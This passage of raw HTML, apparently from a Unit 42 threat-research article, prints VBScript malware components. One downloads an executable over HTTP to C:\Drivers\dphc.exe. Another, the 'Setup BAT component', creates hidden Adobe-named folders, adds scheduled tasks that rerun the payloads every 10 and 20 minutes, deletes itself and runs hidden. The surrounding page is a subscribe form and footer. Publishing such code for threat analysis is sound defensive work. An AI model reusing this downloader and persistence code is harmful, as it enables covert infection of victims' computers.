class="crayon-s">"&lt;strong&gt;C:\Drivers\dphc.exe"</span><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-v">strong</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-5f6928a008c3e507234507-6"><span class="crayon-e">On </span><span class="crayon-e">Error </span><span class="crayon-e">Resume </span><span class="crayon-e">Next </span></div><div class="crayon-line" id="crayon-5f6928a008c3e507234507-7"><span class="crayon-e">Set </span><span class="crayon-v">objXMLHTTP</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">CreateObject</span><span class="crayon-sy">(</span><span class="crayon-s">"MSXML2.XMLHTTP"</span><span class="crayon-sy">)</span><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-5f6928a008c3e507234507-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">objXMLHTTP</span><span class="crayon-sy">.</span><span class="crayon-i">open</span><span class="crayon-h"> </span><span class="crayon-s">"GET"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">strFileURL</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-t">false</span><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-5f6928a008c3e507234507-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">objXMLHTTP</span><span class="crayon-sy">.</span><span class="crayon-e">send</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-5f6928a008c3e507234507-10"><span class="crayon-st">If</span><span class="crayon-h"> </span><span class="crayon-v">objXMLHTTP</span><span class="crayon-sy">.</span><span class="crayon-v">Status</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">200</span><span class="crayon-h"> </span><span class="crayon-st">Then</span><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-5f6928a008c3e507234507-11"><span class="crayon-e">Set </span><span class="crayon-v">objADOStream</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">CreateObject</span><span class="crayon-sy">(</span><span class="crayon-s">"ADODB.Stream"</span><span class="crayon-sy">)</span><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-5f6928a008c3e507234507-12"><span class="crayon-v">objADOStream</span><span class="crayon-sy">.</span><span class="crayon-e">Open </span></div><div class="crayon-line" id="crayon-5f6928a008c3e507234507-13"><span class="crayon-v">objADOStream</span><span class="crayon-sy">.</span><span class="crayon-v">Type</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-h">&nbsp;&nbsp;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f6928a008c3e507234507-14"><span class="crayon-v">objADOStream</span><span class="crayon-sy">.</span><span class="crayon-e">Write </span><span class="crayon-v">objXMLHTTP</span><span class="crayon-sy">.</span><span class="crayon-e">ResponseBody </span></div><div class="crayon-line" id="crayon-5f6928a008c3e507234507-15"><span class="crayon-v">objADOStream</span><span class="crayon-sy">.</span><span class="crayon-v">Position</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp; </span></div><div class="crayon-line crayon-striped-line" id="crayon-5f6928a008c3e507234507-16"><span class="crayon-e">Set </span><span class="crayon-v">objFSO</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">CreateObject</span><span class="crayon-sy">(</span><span class="crayon-s">"Scripting.FileSystemObject"</span><span class="crayon-sy">)</span><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-5f6928a008c3e507234507-17"><span class="crayon-st">If</span><span class="crayon-h"> </span><span class="crayon-v">objFSO</span><span class="crayon-sy">.</span><span class="crayon-e">Fileexists</span><span class="crayon-sy">(</span><span class="crayon-v">strPath</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-st">Then</span><span class="crayon-h"> </span><span class="crayon-v">WScript</span><span class="crayon-sy">.</span><span class="crayon-e">Quit</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-5f6928a008c3e507234507-18"><span class="crayon-e">Set </span><span class="crayon-v">objFSO</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">Nothing </span></div><div class="crayon-line" id="crayon-5f6928a008c3e507234507-19"><span class="crayon-v">objADOStream</span><span class="crayon-sy">.</span><span class="crayon-e">SaveToFile </span><span class="crayon-e">strPath </span></div><div class="crayon-line crayon-striped-line" id="crayon-5f6928a008c3e507234507-20"><span class="crayon-v">objADOStream</span><span class="crayon-sy">.</span><span class="crayon-e">Close </span></div><div class="crayon-line" id="crayon-5f6928a008c3e507234507-21"><span class="crayon-e">Set </span><span class="crayon-v">objADOStream</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">Nothing </span></div><div class="crayon-line crayon-striped-line" id="crayon-5f6928a008c3e507234507-22"><span class="crayon-st">End</span><span class="crayon-h"> </span><span class="crayon-st">if</span><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-5f6928a008c3e507234507-23"><span class="crayon-e">Set </span><span class="crayon-v">objXMLHTTP</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-i">Nothing</span><span class="crayon-h">&nbsp;&nbsp;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0013 seconds] -->
<p></p>
<ul>
<li>Setup BAT component</li>
</ul>
<p>[Audio.txt -&gt; Audio.bat CODE]</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f6928a008c44400480467" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-mixed-highlight" title="Contains Mixed Languages"></span><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
Set oFile = fso.CreateTextFile("c:\Drivers\Audio.txt")
oFile.WriteLine ("echo off")
oFile.WriteLine ("md %USERPROFILE%\Adobe\Driver\pdf")
oFile.WriteLine ("md %USERPROFILE%\Adobe\Driver\dwg")
oFile.WriteLine ("md %USERPROFILE%\Daily\Backup\Files")
oFile.WriteLine ("attrib +a +h +s %USERPROFILE%\Adobe")
oFile.WriteLine ("attrib +a +h +s %USERPROFILE%\Daily")
oFile.WriteLine ("attrib +a +h +s C:\Drivers")
oFile.WriteLine ("del /f 
%USERPROFILE%\Adobe\Driver\pdf\pid.txt")
oFile.WriteLine ("del /f 
%USERPROFILE%\Adobe\Driver\dwg\pid.txt"
oFile.WriteLine ("SET /A %COMPUTERNAME%")
oFile.WriteLine ("SET /A RAND=%RANDOM% 10000 + 1")
oFile.WriteLine ("echo %COMPUTERNAME%-%RAND% &gt;&gt; 
%USERPROFILE%\Adobe\Driver\pdf\pid.txt")
oFile.WriteLine ("echo %COMPUTERNAME%-%RAND% &gt;&gt; 
&lt;strong&gt;%USERPROFILE%\Adobe\Driver\dwg\pid.txt")&lt;/strong&gt;
oFile.WriteLine ("schtasks /delete /tn Winmgt_log /f")
oFile.WriteLine ("schtasks /delete /tn Yahoo_Drive /f")
oFile.WriteLine ("schtasks /create /sc minute /mo 10 /f /tn 
Winmgt_log /tr C:\Drivers\dphc.exe")
oFile.WriteLine ("schtasks /create /sc minute /mo 20 /f /tn 
Yahoo_Drive /tr C:\Drivers\Drive.vbs")
oFile.WriteLine ("ren C:\Drivers\Drive.txt Drive.vbs ")
oFile.WriteLine ("del %0")
oFile.Close
Set fso = Nothing
Set oFile = Nothing

    Dim OldName, NewName
    GivenLocation = "C:\Drivers\"
    OldName = "Audio.txt"
    &lt;strong&gt;NewName = "Audio.bat"&lt;/strong&gt;
    On Error Resume Next
    Name GivenLocation &amp; OldName As GivenLocation &amp; NewName
    Dim RetVal
    RetVal = Shell("C:\Drivers\Audio.bat", vbHide)</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f6928a008c44400480467-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f6928a008c44400480467-2">2</div><div class="crayon-num" data-line="crayon-5f6928a008c44400480467-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f6928a008c44400480467-4">4</div><div class="crayon-num" data-line="crayon-5f6928a008c44400480467-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f6928a008c44400480467-6">6</div><div class="crayon-num" data-line="crayon-5f6928a008c44400480467-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f6928a008c44400480467-8">8</div><div class="crayon-num" data-line="crayon-5f6928a008c44400480467-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f6928a008c44400480467-10">10</div><div class="crayon-num" data-line="crayon-5f6928a008c44400480467-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f6928a008c44400480467-12">12</div><div class="crayon-num" data-line="crayon-5f6928a008c44400480467-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f6928a008c44400480467-14">14</div><div class="crayon-num" data-line="crayon-5f6928a008c44400480467-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f6928a008c44400480467-16">16</div><div class="crayon-num" data-line="crayon-5f6928a008c44400480467-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f6928a008c44400480467-18">18</div><div class="crayon-num" data-line="crayon-5f6928a008c44400480467-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f6928a008c44400480467-20">20</div><div class="crayon-num" data-line="crayon-5f6928a008c44400480467-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f6928a008c44400480467-22">22</div><div class="crayon-num" data-line="crayon-5f6928a008c44400480467-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f6928a008c44400480467-24">24</div><div class="crayon-num" data-line="crayon-5f6928a008c44400480467-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f6928a008c44400480467-26">26</div><div class="crayon-num" data-line="crayon-5f6928a008c44400480467-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f6928a008c44400480467-28">28</div><div class="crayon-num" data-line="crayon-5f6928a008c44400480467-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f6928a008c44400480467-30">30</div><div class="crayon-num" data-line="crayon-5f6928a008c44400480467-31">31</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f6928a008c44400480467-32">32</div><div class="crayon-num" data-line="crayon-5f6928a008c44400480467-33">33</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f6928a008c44400480467-34">34</div><div class="crayon-num" data-line="crayon-5f6928a008c44400480467-35">35</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f6928a008c44400480467-36">36</div><div class="crayon-num" data-line="crayon-5f6928a008c44400480467-37">37</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f6928a008c44400480467-38">38</div><div class="crayon-num" data-line="crayon-5f6928a008c44400480467-39">39</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f6928a008c44400480467-40">40</div><div class="crayon-num" data-line="crayon-5f6928a008c44400480467-41">41</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f6928a008c44400480467-1"><span class="crayon-e">Set </span><span class="crayon-v">oFile</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">fso</span><span class="crayon-sy">.</span><span class="crayon-e">CreateTextFile</span><span class="crayon-sy">(</span><span class="crayon-s">"c:\Drivers\Audio.txt"</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f6928a008c44400480467-2"><span class="crayon-v">oFile</span><span class="crayon-sy">.</span><span class="crayon-e">WriteLine</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-s">"echo off"</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-5f6928a008c44400480467-3"><span class="crayon-v">oFile</span><span class="crayon-sy">.</span><span class="crayon-e">WriteLine</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-s">"md %USERPROFILE%\Adobe\Driver\pdf"</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f6928a008c44400480467-4"><span class="crayon-v">oFile</span><span class="crayon-sy">.</span><span class="crayon-e">WriteLine</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-s">"md %USERPROFILE%\Adobe\Driver\dwg"</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-5f6928a008c44400480467-5"><span class="crayon-v">oFile</span><span class="crayon-sy">.</span><span class="crayon-e">WriteLine</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-s">"md %USERPROFILE%\Daily\Backup\Files"</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f6928a008c44400480467-6"><span class="crayon-v">oFile</span><span class="crayon-sy">.</span><span class="crayon-e">WriteLine</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-s">"attrib +a +h +s %USERPROFILE%\Adobe"</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-5f6928a008c44400480467-7"><span class="crayon-v">oFile</span><span class="crayon-sy">.</span><span class="crayon-e">WriteLine</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-s">"attrib +a +h +s %USERPROFILE%\Daily"</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f6928a008c44400480467-8"><span class="crayon-v">oFile</span><span class="crayon-sy">.</span><span class="crayon-e">WriteLine</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-s">"attrib +a +h +s C:\Drivers"</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-5f6928a008c44400480467-9"><span class="crayon-v">oFile</span><span class="crayon-sy">.</span><span class="crayon-e">WriteLine</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-s">"del /f </span></div><div class="crayon-line crayon-striped-line" id="crayon-5f6928a008c44400480467-10"><span class="crayon-s"><span class="crayon-ta">%</span><span class="crayon-v">USERPROFILE</span><span class="crayon-o">%</span><span class="crayon-sy">\</span><span class="crayon-v">Adobe</span><span class="crayon-sy">\</span><span class="crayon-v">Driver</span><span class="crayon-sy">\</span><span class="crayon-v">pdf</span><span class="crayon-sy">\</span><span class="crayon-v">pid</span><span class="crayon-sy">.</span><span class="crayon-i">txt</span>"<span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-5f6928a008c44400480467-11"></span></div><div class="crayon-line crayon-striped-line" id="crayon-5f6928a008c44400480467-12"><span class="crayon-s">oFile.WriteLine ("</span><span class="crayon-e">del</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-e">f</span><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-5f6928a008c44400480467-13"><span class="crayon-ta">%</span><span class="crayon-v">USERPROFILE</span><span class="crayon-o">%</span><span class="crayon-sy">\</span><span class="crayon-v">Adobe</span><span class="crayon-sy">\</span><span class="crayon-v">Driver</span><span class="crayon-sy">\</span><span class="crayon-v">dwg</span><span class="crayon-sy">\</span><span class="crayon-v">pid</span><span class="crayon-sy">.</span><span class="crayon-i">txt</span>"</div><div class="crayon-line crayon-striped-line" id="crayon-5f6928a008c44400480467-14">&nbsp;</div><div class="crayon-line" id="crayon-5f6928a008c44400480467-15"><span class="crayon-v">oFile</span><span class="crayon-sy">.</span><span class="crayon-e">WriteLine</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-s">"SET /A %COMPUTERNAME%"</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f6928a008c44400480467-16"><span class="crayon-v">oFile</span><span class="crayon-sy">.</span><span class="crayon-e">WriteLine</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-s">"SET /A RAND=%RANDOM% 10000 + 1"</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-5f6928a008c44400480467-17"><span class="crayon-v">oFile</span><span class="crayon-sy">.</span><span class="crayon-e">WriteLine</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-s">"echo %COMPUTERNAME%-%RAND% &gt;&gt; </span></div><div class="crayon-line crayon-striped-line" id="crayon-5f6928a008c44400480467-18"><span class="crayon-s"><span class="crayon-ta">%</span><span class="crayon-v">USERPROFILE</span><span class="crayon-o">%</span><span class="crayon-sy">\</span><span class="crayon-v">Adobe</span><span class="crayon-sy">\</span><span class="crayon-v">Driver</span><span class="crayon-sy">\</span><span class="crayon-v">pdf</span><span class="crayon-sy">\</span><span class="crayon-v">pid</span><span class="crayon-sy">.</span><span class="crayon-i">txt</span>"<span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-5f6928a008c44400480467-19"></span></div><div class="crayon-line crayon-striped-line" id="crayon-5f6928a008c44400480467-20"><span class="crayon-s">oFile.WriteLine ("</span><span class="crayon-v">echo</span><span class="crayon-h"> </span><span class="crayon-o">%</span><span class="crayon-v">COMPUTERNAME</span><span class="crayon-o">%</span><span class="crayon-o">-</span><span class="crayon-o">%</span><span class="crayon-v">RAND</span><span class="crayon-o">%</span><span class="crayon-h"> </span><span class="crayon-o">&gt;&gt;</span><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-5f6928a008c44400480467-21"><span class="crayon-o">&lt;</span><span class="crayon-v">strong</span><span class="crayon-o">&gt;</span><span class="crayon-o">%</span><span class="crayon-v">USERPROFILE</span><span class="crayon-o">%</span><span class="crayon-sy">\</span><span class="crayon-v">Adobe</span><span class="crayon-sy">\</span><span class="crayon-v">Driver</span><span class="crayon-sy">\</span><span class="crayon-v">dwg</span><span class="crayon-sy">\</span><span class="crayon-v">pid</span><span class="crayon-sy">.</span><span class="crayon-i">txt</span><span class="crayon-s">")&lt;/strong&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f6928a008c44400480467-22"><span class="crayon-s">oFile.WriteLine ("</span><span class="crayon-v">schtasks</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">delete</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-e">tn </span><span class="crayon-v">Winmgt_log</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">f</span><span class="crayon-s">")</span></div><div class="crayon-line" id="crayon-5f6928a008c44400480467-23"><span class="crayon-s">oFile.WriteLine ("</span><span class="crayon-v">schtasks</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">delete</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-e">tn </span><span class="crayon-v">Yahoo_Drive</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">f</span><span class="crayon-s">")</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f6928a008c44400480467-24"><span class="crayon-s">oFile.WriteLine ("</span><span class="crayon-v">schtasks</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">create</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-e">sc </span><span class="crayon-v">minute</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">mo</span><span class="crayon-h"> </span><span class="crayon-cn">10</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">f</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-e">tn </span></div><div class="crayon-line" id="crayon-5f6928a008c44400480467-25"><span class="crayon-v">Winmgt_log</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">tr</span><span class="crayon-h"> </span><span class="crayon-v">C</span><span class="crayon-o">:</span><span class="crayon-sy">\</span><span class="crayon-v">Drivers</span><span class="crayon-sy">\</span><span class="crayon-v">dphc</span><span class="crayon-sy">.</span><span class="crayon-i">exe</span><span class="crayon-s">")</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f6928a008c44400480467-26"><span class="crayon-s">oFile.WriteLine ("</span><span class="crayon-v">schtasks</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">create</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-e">sc </span><span class="crayon-v">minute</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">mo</span><span class="crayon-h"> </span><span class="crayon-cn">20</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">f</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-e">tn </span></div><div class="crayon-line" id="crayon-5f6928a008c44400480467-27"><span class="crayon-v">Yahoo_Drive</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">tr</span><span class="crayon-h"> </span><span class="crayon-v">C</span><span class="crayon-o">:</span><span class="crayon-sy">\</span><span class="crayon-v">Drivers</span><span class="crayon-sy">\</span><span class="crayon-v">Drive</span><span class="crayon-sy">.</span><span class="crayon-i">vbs</span><span class="crayon-s">")</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f6928a008c44400480467-28"><span class="crayon-s">oFile.WriteLine ("</span><span class="crayon-i">ren</span><span class="crayon-h"> </span><span class="crayon-v">C</span><span class="crayon-o">:</span><span class="crayon-sy">\</span><span class="crayon-v">Drivers</span><span class="crayon-sy">\</span><span class="crayon-v">Drive</span><span class="crayon-sy">.</span><span class="crayon-e">txt </span><span class="crayon-v">Drive</span><span class="crayon-sy">.</span><span class="crayon-i">vbs</span><span class="crayon-h"> </span><span class="crayon-s">")</span></div><div class="crayon-line" id="crayon-5f6928a008c44400480467-29"><span class="crayon-s">oFile.WriteLine ("</span><span class="crayon-v">del</span><span class="crayon-h"> </span><span class="crayon-o">%</span><span class="crayon-cn">0</span><span class="crayon-s">")</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f6928a008c44400480467-30"><span class="crayon-s">oFile.Close</span></div><div class="crayon-line" id="crayon-5f6928a008c44400480467-31"><span class="crayon-s">Set fso = Nothing</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f6928a008c44400480467-32"><span class="crayon-s">Set oFile = Nothing</span></div><div class="crayon-line" id="crayon-5f6928a008c44400480467-33">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-5f6928a008c44400480467-34"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;Dim OldName, NewName</span></div><div class="crayon-line" id="crayon-5f6928a008c44400480467-35"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;GivenLocation = "</span><span class="crayon-v">C</span><span class="crayon-o">:</span><span class="crayon-sy">\</span><span class="crayon-v">Drivers</span><span class="crayon-sy">\</span>"</div><div class="crayon-line crayon-striped-line" id="crayon-5f6928a008c44400480467-36"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">OldName</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"Audio.txt"</span></div><div class="crayon-line" id="crayon-5f6928a008c44400480467-37"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">&lt;</span><span class="crayon-v">strong</span><span class="crayon-o">&gt;</span><span class="crayon-v">NewName</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"Audio.bat"</span><span class="crayon-o">&lt;</span><span class="crayon-o">/</span><span class="crayon-v">strong</span><span class="crayon-o">&gt;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f6928a008c44400480467-38"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">On </span><span class="crayon-e">Error </span><span class="crayon-e">Resume </span><span class="crayon-e">Next</span></div><div class="crayon-line" id="crayon-5f6928a008c44400480467-39"><span class="crayon-e">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">Name </span><span class="crayon-v">GivenLocation</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-h"> </span><span class="crayon-e">OldName </span><span class="crayon-st">As</span><span class="crayon-h"> </span><span class="crayon-v">GivenLocation</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-h"> </span><span class="crayon-e">NewName</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f6928a008c44400480467-40"><span class="crayon-e">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">Dim </span><span class="crayon-e">RetVal</span></div><div class="crayon-line" id="crayon-5f6928a008c44400480467-41"><span class="crayon-e">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">RetVal</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">Shell</span><span class="crayon-sy">(</span><span class="crayon-s">"C:\Drivers\Audio.bat"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">vbHide</span><span class="crayon-sy">)</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0025 seconds] -->
<p>&nbsp;</p>
          <div class="article__subscribe mb-40 text-gray-400 bg-gray-200 rounded-lg">
  <h4 class="h3 mb-10 text-black">Get updates from <br class="d-sm-none"> Palo Alto<br class="d-sm-none"> Networks!</h4>
  <p>Sign up to receive the latest news, cyber threat intelligence and research from us</p>
  <!-- <form action="https://app-guse4001.marketo.com/index.php/leadCapture/save2" method="post" novalidate class="subscribe-form py-25" name="Unit42_Subscribe"> -->
  <form action="https://start.paloaltonetworks.com/index.php/leadCapture/save2" method="post" novalidate class="subscribe-form py-25" name="Unit42_Subscribe">
    <input type="hidden" value="1086" name="formid">
    <!-- <input type="hidden" value="818-CZC-273" name="munchkinId"> -->
    <input type="hidden" value="531-OCS-018" name="munchkinId">
    <input type="hidden" value="2141" name="lpId">
    <input type="hidden" value="1086" name="formVid">
    <input type="hidden" name="mkto_optinunit42" value="true">
    <input type="hidden" name="mkto_opt-in" value="true">
    <div class="row">
      <div class="col-sm col-12 mb-sm-0 mb-15">
        <input type="email" name="Email" placeholder="Email address" class="subscribe-field d-block w-100 px-sm-25 px-15 bg-white">
        <p class="error-mail d-none mt-15 text-danger" style="color: #dc3545">Please enter your email address!</p>
      </div>
      <div class="col-sm-auto col-12">
          <input type="submit" value="Subscribe" class="btn btn--black btn--sm w-100" disabled="disabled">
      </div>
    </div>

    <div class="google-recapth mt-15">
      <div class="g-recaptcha" data-expired-callback="captchaExpires" data-callback="captchaComplete" data-sitekey="6LfKOrwUAAAAAOwgjxrEcx-pcfwe8OquUw6ommTK"></div>
      <p class="error-recaptcha d-none mt-15 text-danger" style="color: #dc3545">Please mark, I'm not a robot!</p>
    </div>
  </form>

  <div class="font-size-ex-sm col-sm-7 p-0">
    <p>By submitting this form, you agree to our <a href="https://www.paloaltonetworks.com/legal-notices/terms-of-use">Terms of Use</a> and acknowledge our <a href="https://www.paloaltonetworks.com/legal-notices/privacy">Privacy Statement</a>.</p>
  </div>
</div>

<script type="text/javascript" src="https://researchcenter.paloaltonetworks.com/wp-content/plugins/google-analyticator/external-tracking.min.js?ver=6.4.9"></script>
        </div>
      </div>
    </div>
  </article>
<footer class="site-footer px-sm-0 px-15">
  <div class="pt-40">
    <div class="container pt-sm-30">
      <div class="row justify-content-lg-center">
        <div class="col-lg-11 col-12">
          <div class="row">
            <div class="col-lg-4 col-sm-3 col-12 order-sm-2">
              <nav class="footer-socials mb-sm-0 mb-25 text-white text-sm-right">
                                                <a href="https://twitter.com/Unit42_Intel" target="_blank"><span class="ui ui-4"></span></a>
                <a href="https://github.com/pan-unit42" target="_blank"><span class="ui ui-5"></span></a>
              </nav>
            </div>

            <div class="col-lg-8 col-sm-9 col-12 order-sm-1">
              <div class="row">
